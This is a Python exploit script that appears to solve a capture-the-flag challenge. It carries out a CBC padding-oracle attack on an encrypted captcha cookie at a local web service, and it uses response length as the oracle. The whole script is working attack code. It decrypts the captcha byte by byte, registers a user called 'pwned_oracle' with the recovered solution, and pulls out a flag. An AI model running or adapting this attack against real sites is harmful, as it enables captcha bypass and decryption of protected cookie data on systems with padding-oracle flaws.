#!/usr/bin/env python3
import requests
import base64
import re

TARGET = "http://127.0.0.1:32869/"

print("[*] Fetching fresh captcha session...")
s = requests.Session()
r = s.get(TARGET)
captcha_cookie = s.cookies.get('captcha')

# Fixed CSRF extraction with proper regex  
csrf_match = re.search(r'<input[^>]*name="csrf_token"[^>]*value="([^"]+)"', r.text)
if not csrf_match:
    print("[!] Could not find CSRF token")
    print(r.text[:500])
    exit(1)
csrf_token = csrf_match.group(1)

print(f"[+] Captcha cookie: {captcha_cookie}")
print(f"[+] CSRF token: {csrf_token[:30]}...")

# Parse cookie
cookie_bytes = base64.b64decode(captcha_cookie)
iv = bytearray(cookie_bytes[:16])
ct = cookie_bytes[16:]

print(f"[+] IV: {iv.hex()}")
print(f"[+] CT: {ct.hex()}")
print(f"[+] Total cookie length: {len(cookie_bytes)} bytes")

# Oracle function
def oracle(test_iv):
    test_cookie = base64.b64encode(bytes(test_iv) + ct).decode()
    test_s = requests.Session()
    test_s.cookies.set('captcha', test_cookie)
    test_s.cookies.set('session', s.cookies.get('session'))
    try:
        resp = test_s.post(TARGET, data={
            'username': 'test',
            'captcha': 'dummy',
            'csrf_token': csrf_token,
            'submit': 'Register'
        }, timeout=5)
        return len(resp.content)
    except:
        return -1

print("\n[*] Starting byte-by-byte decryption...")
plaintext = bytearray(16)
intermediate = bytearray(16)

# Get baseline with original IV
baseline = oracle(iv)
print(f"[*] Baseline response: {baseline} bytes")

for byte_pos in range(15, -1, -1):
    padding_val = 16 - byte_pos
    print(f"\n[*] Decrypting byte {16-byte_pos}/16 (position {byte_pos}, padding={padding_val})...")
    
    # Prepare IV for this padding value
    attack_iv = bytearray(iv)
    for i in range(byte_pos + 1, 16):
        attack_iv[i] = intermediate[i] ^ padding_val
    
    found = False
    for guess in range(256):
        attack_iv[byte_pos] = guess
        response_len = oracle(attack_iv)
        
        if guess % 64 == 0:
            print(f"  Progress: {guess}/255 (current response: {response_len} bytes)", end='\r')
        
        # Check if valid padding - different from baseline
        if response_len != baseline and response_len > 0:
            # Verify it's real (not for position 15)
            if byte_pos < 15:
                intermediate[byte_pos] = guess ^ padding_val
                plaintext[byte_pos] = intermediate[byte_pos] ^ iv[byte_pos]
                char = chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else '.'
                print(f"\n[+] Byte {16-byte_pos}: 0x{plaintext[byte_pos]:02x} = '{char}'")
                found = True
                break
            else:
                # Position 15 needs verification
                verify_iv = bytearray(attack_iv)
                verify_iv[14] ^= 1
                verify_len = oracle(verify_iv)
                if verify_len != baseline:  # Changed condition
                    intermediate[byte_pos] = guess ^ padding_val
                    plaintext[byte_pos] = intermediate[byte_pos] ^ iv[byte_pos]
                    char = chr(plaintext[byte_pos]) if 32 <= plaintext[byte_pos] < 127 else '.'
                    print(f"\n[+] Byte {16-byte_pos}: 0x{plaintext[byte_pos]:02x} = '{char}'")
                    found = True
                    break
    
    if not found:
        print(f"\n[!] Could not find byte at position {byte_pos}")

# Remove PKCS7 padding
print(f"\n[*] Raw plaintext: {plaintext.hex()}")
print(f"[*] Last byte (padding): {plaintext[-1]}")

if 1 <= plaintext[-1] <= 16:
    pad_len = plaintext[-1]
    plaintext = plaintext[:-pad_len]

try:
    solution = plaintext.decode('utf-8')
    print(f"\n[+] DECRYPTED CAPTCHA SOLUTION: '{solution}'")
    
    # Register user with real solution
    print("\n[*] Registering user with decrypted captcha...")
    final = s.post(TARGET, data={
        'username': 'pwned_oracle',
        'captcha': solution,
        'csrf_token': csrf_token,
        'submit': 'Register'
    })
    
    print("\n" + "="*60)
    if 'FLAG{' in final.text:
        flag_match = re.search(r'FLAG\{[a-f0-9]+\}', final.text)
        if flag_match:
            print(f"\n[SUCCESS] {flag_match.group(0)}")
            print("="*60)
        else:
            print("[!] FLAG found but couldn't extract")
            print(final.text)
    else:
        print("[!] No FLAG found in response")
        print(final.text[:500])
    print("="*60)
        
except Exception as e:
    print(f"\n[!] Error: {e}")
    print(f"[*] Raw bytes: {plaintext.hex()}")
